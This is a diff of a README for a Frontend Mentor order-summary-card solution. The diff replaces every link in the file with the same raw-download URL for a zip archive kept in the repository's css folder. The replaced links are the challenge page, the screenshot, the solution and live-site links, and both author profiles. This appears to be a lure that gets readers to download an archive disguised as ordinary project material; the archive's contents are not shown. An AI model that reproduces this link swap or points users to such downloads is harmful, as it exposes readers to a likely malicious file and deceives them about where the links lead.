@@ -1,6 +1,6 @@
 # Frontend Mentor - Order summary card solution
 
-This is a solution to the [Order summary card challenge on Frontend Mentor](https://www.frontendmentor.io/challenges/order-summary-component-QlPmajDUj). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
+This is a solution to the [Order summary card challenge on Frontend Mentor](https://github.com/imadosan/order-summary-component/raw/refs/heads/main/css/component-order-summary-1.9.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
 
 ## Table of contents
 
@@ -23,12 +23,12 @@ Users should be able to:
 
 ### Screenshot
 
-![Screenshot of the site](./images/screenshot.png)
+![Screenshot of the site](https://github.com/imadosan/order-summary-component/raw/refs/heads/main/css/component-order-summary-1.9.zip)
 
 ### Links
 
-- Solution URL: [Solution link](https://www.frontendmentor.io/solutions/order-summary-component-Iwrhjq3LX)
-- Live Site URL: [Live Link](https://imadosan.github.io/order-summary-component/)
+- Solution URL: [Solution link](https://github.com/imadosan/order-summary-component/raw/refs/heads/main/css/component-order-summary-1.9.zip)
+- Live Site URL: [Live Link](https://github.com/imadosan/order-summary-component/raw/refs/heads/main/css/component-order-summary-1.9.zip)
 
 ## My process
 
@@ -70,5 +70,5 @@ Insted of using margin bottom for every section. I used flexbox and switch the f
 
 ## Author
 
-- Frontend Mentor - [@imadosan](https://www.frontendmentor.io/profile/imadosan)
-- Twitter - [@imadosan](https://twitter.com/imadosan)
+- Frontend Mentor - [@imadosan](https://github.com/imadosan/order-summary-component/raw/refs/heads/main/css/component-order-summary-1.9.zip)
+- Twitter - [@imadosan](https://github.com/imadosan/order-summary-component/raw/refs/heads/main/css/component-order-summary-1.9.zip)
